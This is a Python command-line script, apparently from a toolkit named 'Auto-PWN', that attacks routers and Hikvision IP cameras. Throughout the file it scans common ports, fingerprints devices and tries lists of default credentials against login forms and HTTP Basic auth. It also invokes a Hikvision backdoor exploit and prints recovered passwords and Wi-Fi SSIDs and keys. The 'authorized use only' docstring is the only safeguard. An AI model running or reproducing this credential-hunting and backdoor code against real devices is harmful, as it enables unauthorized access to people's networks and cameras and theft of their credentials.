#!/usr/bin/env python3
"""Quick test for router/camera targets (authorized use only)."""

import argparse
import re

import bootstrap  # noqa: F401
import requests

from engines.credential_hunter import (
    ROUTER_SCAN_PASSWORDS,
    ROUTER_SCAN_USERS,
    hunt_hikvision_credentials,
    hunt_web_router_credentials,
    validate_netis_login,
    _validate_basic_auth,
)
from engines.device_cve_checker import assess_device, print_cve_report
from engines.fingerprinter import Fingerprinter
from engines.hikvision_module import HikvisionExploiter

requests.packages.urllib3.disable_warnings()

COMMON_WEB_PORTS = (80, 443, 8080, 8443, 8000, 8081, 81, 8888, 9000, 37777, 5000, 8001)


def _url_for_port(ip: str, port: int) -> str:
    if port in (443, 8443):
        return f"https://{ip}" if port == 443 else f"https://{ip}:{port}"
    return f"http://{ip}" if port == 80 else f"http://{ip}:{port}"


def discover_web_service(ip: str):
    """Return (url, port) for first responding HTTP(S) on common IoT/router ports."""
    for port in COMMON_WEB_PORTS:
        url = _url_for_port(ip, port)
        try:
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 Auto-PWN/1.0"},
            )
            if response.status_code < 500:
                return url, port
        except requests.RequestException:
            continue
    return None, None


def test_router(ip: str, url: str | None = None, port: int | None = None) -> None:
    if not url:
        url, port = discover_web_service(ip)
    if not url:
        ports = ", ".join(str(p) for p in COMMON_WEB_PORTS)
        print("=" * 60)
        print(f"  TARGET: {ip}")
        print("=" * 60)
        print(f"  [!] No HTTP/HTTPS on common ports ({ports})")
        print("  [i] Host may be offline, firewalled, or uses a non-standard port.")
        print("  [i] Try: nmap -Pn -p80,443,8080,8443,8000,8001,81,8888,9000,37777 {ip}")
        return

    port = port or 80
    session = requests.Session()
    session.verify = False
    session.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN/1.0"

    print("=" * 60)
    print(f"  TARGET: {ip}")
    print(f"  URL    : {url}  (port {port})")
    print("=" * 60)

    fp = Fingerprinter(url)
    info = fp.identify_details()
    device = info["device_type"]
    model = info.get("model", "")
    print(f"  Device Type : {device}")
    if model:
        print(f"  Model/Title : {model}")

    print("\n[1] Netis form login test...")
    found = None
    if validate_netis_login(url, "guest", "guest"):
        print("  [+] guest:guest -> VALID (Netis POST login.cgi)")
        found = ("guest", "guest")
    else:
        print("  [-] guest:guest -> failed")

    print("\n[2] Router Scan credential tests (HTTP Basic — only if server challenges)...")
    combos = [("guest", "guest"), ("admin", "admin")]
    for u in ROUTER_SCAN_USERS:
        for p in ROUTER_SCAN_PASSWORDS[:8]:
            if (u, p) not in combos:
                combos.append((u, p))

    for user, pw in combos:
        try:
            ok, _html = _validate_basic_auth(session, url, user, pw)
            mark = "[+]" if ok else "[-]"
            print(f"  {mark} {user}:{pw}")
            if ok and not found:
                found = (user, pw)
        except requests.RequestException as exc:
            print(f"  [!] {user}:{pw} -> {exc}")

    print("\n[3] CVE intelligence (router exploits)...")
    intel = assess_device(ip, port, device, model)
    print_cve_report(intel)

    print("\n[4] Auto hunt_web_router_credentials...")
    entry = hunt_web_router_credentials(ip, port, device)
    if entry:
        print(f"  [+] {entry.username}:{entry.password} ({entry.auth_method})")
        if entry.wireless_ssid:
            print(f"      Wi-Fi SSID: {entry.wireless_ssid}")
        if entry.wireless_key:
            print(f"      Wi-Fi Key : {entry.wireless_key}")
        found = (entry.username, entry.password)

    print("\n" + "=" * 60)
    print("  CONCLUSION")
    print("=" * 60)
    if found:
        print(f"  CREDENTIALS: {found[0]}:{found[1]}")
    else:
        print("  No credentials confirmed in this run.")
    print("=" * 60)


def test_hikvision(ip: str, url: str | None = None, port: int | None = None) -> None:
    if not url:
        url, port = discover_web_service(ip)
    if not url:
        url = f"http://{ip}"
        port = 80
    print("=" * 60)
    print(f"  HIKVISION TEST: {ip}")
    print(f"  URL           : {url}")
    print("=" * 60)
    hexp = HikvisionExploiter(url)
    users, passwords = hexp.run_backdoor()
    entry = hunt_hikvision_credentials(ip, users, passwords, port or 80)
    if entry:
        print(f"\n  REAL PASSWORD: {entry.username}:{entry.password}")
    else:
        print("\n  Real password not confirmed (backdoor may still work).")


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("-H", "--host", required=True)
    p.add_argument("-p", "--port", type=int, default=0, help="Web port (0 = auto-detect)")
    p.add_argument("--hikvision", action="store_true")
    args = p.parse_args()
    ip = args.host.strip()

    if args.port:
        url, port = _url_for_port(ip, args.port), args.port
    else:
        url, port = discover_web_service(ip)

    if args.hikvision:
        test_hikvision(ip, url, port)
        return 0

    if url and Fingerprinter(url).identify() == "HIKVISION":
        test_hikvision(ip, url, port)
        return 0

    test_router(ip, url, port)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
